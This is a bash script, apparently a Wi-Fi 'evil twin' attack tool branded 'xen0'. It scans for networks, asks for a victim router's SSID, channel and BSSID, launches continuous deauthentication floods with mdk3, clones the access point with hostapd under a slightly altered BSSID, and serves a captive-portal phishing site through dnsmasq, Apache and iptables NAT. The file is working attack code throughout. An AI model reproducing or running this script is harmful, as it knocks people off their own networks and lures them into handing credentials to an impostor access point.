airmon-ng stop mon0
airmon-ng stop wlan0mon
airmon-ng stop wlan0
iw dev wlan0 interface add mon0 type monitor
rm -R partial
crdir=$(pwd)
echo $crdir
cd site
pwd
ls
rm -r generate_204
mkdir generate_204
cd $crdir
mkdir partial
sleep 1
cp -R site/ partial/
cd partial
cd site
rm -r generate_204
cd $crdir
cp -a partial/site/. site/generate_204
cp -R site/. /var/www/html
sleep 1;
sudo killall -9 dnsmasq
sudo killall -9 hostapd
rm -r partial
clear;
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"
echo -e $green'
 __ _____ ___  / _ \
 \ \ / -_) _ \/ // /
/_\_\\__/_//_/\___/ 
';
echo -e $red"
| |          (_|   |_/           
| |            |   | __   _  _   
|/ \_|   |     |   |/  \_/ |/ |  
 \_/  \_/|/     \_/ \__/   |  |_/
        /|                       
        \|                       
"$transparent;

user=$red'root'$white'@'$blue'xen0 '$white'>>  '
chmod +x deauth2.sh
chmod +x dmon.sh
	echo -ne "cat..............."
        if ! hash cat 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "airmon-ng........."
        if ! hash airmon-ng 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "airbase-ng........"
        if ! hash airbase-ng 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "net-tools........."
        if ! hash ifconfig 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "dnsmasq..........."
        if ! hash dnsmasq 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "php..............."
        if ! hash php 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "mysql/mariadb....."
        if ! hash mysql 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "iptables.........."
        if ! hash iptables 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "apache2..........."
        if ! hash apache2 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
    echo -ne "mdk4.............."
        if ! hash mdk4 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025
echo -e 'Enter Interface'
echo -n -e $user''$yellow
read interface
STR=$interface
SUB='mon'
if [[ "$STR" == *"$SUB"* ]]; then
  suc=$interface
else
	suc=$interface"mon"
fi
echo $suc;
xterm -title 'Enabling Monitoring' -e 'airmon-ng check kill; airmon-ng start '$interface
echo -n -e $white'Would you like to change the dnsmasq config file? Current location is at: '$yellow; cat conf/current.txt
echo ' (y/n)';
echo -n -e $user''$yellow
read choice;
if [[ "$choice" == *"y"* ]]; then
	echo -n -e 'New location: ';
	read newloc;
	echo $newloc > conf/current.txt;
else
	echo 'Okay.'
fi
rm tmp/results-01.csv;
xterm -title 'Select Target Router' -e 'airodump-ng -w tmp/results --output-format csv '$suc;
echo -e $red'WARNING: '$green'SELECT THE SSID AND NOT THE NUMBER (the last column, select one)';
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
                longueur=${#MAC}
                PRIVACY=$(echo $PRIVACY| tr -d "^ ")
                PRIVACY=${PRIVACY:0:4}
                if [ $longueur -ge 17 ]; then
                        i=$(($i+1))
                        POWER=`expr $POWER + 100`

                        if [ "$CLIENTE" != "" ]; then
                                CLIENTE="*"
                        echo -e " "$red"["$yellow"$i"$red"]"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

                        else

                        echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""

                        fi

                        aidlength=$IDLENGTH
                        assid[$i]=$ESSID
                        achannel[$i]=$CHANNEL
                        amac[$i]=$MAC
                        aprivacy[$i]=$PRIVACY
                        aspeed[$i]=$SPEED
                fi
        done < tmp/results-01.csv
echo 'Enter the SSID of victim'
echo -n -e $user''$yellow
read ssid;
echo $ssid > tmp/currssid.txt
echo 'Enter the CHANNEL of victim'
echo -n -e $user''$yellow
read channel;
if [[ $channel -eq 11 ]]
then
	fakechan=$(( $channel - 2 ))
else
	fakechan=$(( $channel + 1 ))
fi
echo "Fake Channel is: "$fakechan
echo 'Enter the BSSID of victim'
echo -n -e $user''$yellow
read bssid;
IFS=':' read -r -a array <<< "$bssid"
last="${array[5]}"
var="${array[2]}"
copy=${var}
len=${#copy}
for((i=$len-1;i>=0;i--)); do rev="$rev${copy:$1:1}"; done
echo "$rev"
modbssid="${bssid/$last/$rev}"
sleep 1;
echo "Modified BSSID: "$modbssid
echo $bssid > tmp/blacklist.txt
xterm -fg '#00ff00' -bg '#151519' -fn 6x10 -geometry 80x30-0-0 -title 'DeauTH ALL' -e 'mdk3 '$suc' d -b tmp/blacklist.txt -c '$channel'; sleep 99999999999999;' &
echo "
interface=wlan0
driver=nl80211
ssid="$ssid"
bssid="$modbssid"
channel="$channel > conf/hostapd.conf
xterm -fg '#ffff00' -bg '#151519' -fn 6x10 -geometry 80x30+0+0 -title 'Fake AP' -e 'hostapd conf/hostapd.conf; sleep 999999999999999;' &
dnsloc="$(cat conf/current.txt)"
sleep 1;
xterm -fg '#00ffff' -bg '#151519' -fn 6x10 -geometry 80x30-0+0 -title 'DNSMASQ' -e '
ifconfig wlan0 10.0.0.1/24 up; sleep 1;
echo '$dnsloc';
dnsmasq -C '$dnsloc' -d;' &
xterm -fg '#ff1493' -bg '#151519' -fn 6x10 -geometry 80x30+0-0 -title 'APACHE2 START' -e '
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1;
echo 1 > /proc/sys/net/ipv4/ip_forward;
iptables -P FORWARD ACCEPT;
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE;
sudo service apache2 start;' &